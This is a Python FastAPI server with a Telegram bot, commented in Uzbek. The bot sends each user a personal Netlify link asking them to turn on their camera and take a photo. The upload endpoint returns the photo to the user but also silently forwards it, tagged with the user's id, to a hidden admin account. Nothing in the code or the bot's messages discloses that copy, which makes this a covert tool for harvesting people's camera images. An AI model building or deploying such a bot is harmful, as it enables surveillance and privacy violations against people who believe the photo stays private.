import base64
from contextlib import asynccontextmanager
import os
from pathlib import Path
import uuid

from dotenv import load_dotenv
from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from telegram import Bot, Update
from telegram.ext import Application, CommandHandler, ContextTypes

load_dotenv()

TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID_RAW = os.getenv("ADMIN_ID")

if not TOKEN:
    raise RuntimeError("BOT_TOKEN kiritilmagan!")
if not ADMIN_ID_RAW:
    raise RuntimeError("ADMIN_ID kiritilmagan!")

ADMIN_ID = int(ADMIN_ID_RAW)

# Haqiqiy Netlify havolangiz
NETLIFY_URL = "https://jade-madeleine-332235.netlify.app"

# Telegram Bot qismi
tg_app = Application.builder().token(TOKEN).build()


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    personal_link = f"{NETLIFY_URL}/?uid={user_id}"

    await update.message.reply_text(
        f"Salom! 👋\n\nKamerani ishga tushirish va rasmga olish uchun quyidagi havolangiz ustiga bosing:\n\n{personal_link}"
    )


tg_app.add_handler(CommandHandler("start", start))


# FastAPI va Botni birgalikda ishga tushirish
@asynccontextmanager
async def lifespan(app: FastAPI):
    await tg_app.initialize()
    await tg_app.start()
    await tg_app.updater.start_polling()
    yield
    await tg_app.updater.stop()
    await tg_app.stop()
    await tg_app.shutdown()


app = FastAPI(lifespan=lifespan)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=False,
    allow_methods=["POST", "OPTIONS"],
    allow_headers=["*"],
)

bot = Bot(TOKEN)
UPLOADS = Path("uploads")
UPLOADS.mkdir(exist_ok=True)


class Photo(BaseModel):
    uid: int
    image: str


@app.get("/health")
async def health():
    return {"ok": True}


@app.post("/upload")
async def upload(photo: Photo):
    if photo.uid <= 0:
        raise HTTPException(400, "Invalid user id")

    try:
        header, encoded = photo.image.split(",", 1)
        if not header.startswith("data:image/"):
            raise ValueError
        raw = base64.b64decode(encoded)
    except Exception:
        raise HTTPException(400, "Invalid image")

    if not raw or len(raw) > 10 * 1024 * 1024:
        raise HTTPException(413, "Image too large")

    path = UPLOADS / f"{uuid.uuid4().hex}.jpg"
    path.write_bytes(raw)

    try:
        # Rasmni foydalanuvchining o'ziga yuborish
        with path.open("rb") as f:
            await bot.send_photo(
                chat_id=photo.uid, photo=f, caption="Siz olgan surat."
            )

        # Rasmni Adminga yuborish
        with path.open("rb") as f:
            await bot.send_photo(
                chat_id=ADMIN_ID,
                photo=f,
                caption=f"Yangi surat | user_id: {photo.uid}",
            )
    finally:
        path.unlink(missing_ok=True)

    return {"ok": True}
